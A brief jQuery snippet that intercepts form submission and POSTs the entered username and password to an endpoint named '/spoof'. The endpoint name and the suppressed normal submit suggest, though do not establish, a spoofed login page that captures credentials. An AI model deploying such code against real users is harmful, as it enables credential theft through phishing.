$(document).ready(function() {
  $("form").on("submit", function(event) {
    $.ajax({
      url: "/spoof",
      data: {
        username: $("#usernameInput").val(),
        password: $("#passwordInput").val()
      },
      type: "POST",
      success: function(response) {
        console.log(response);
      }
    });

    event.preventDefault();
  });
});
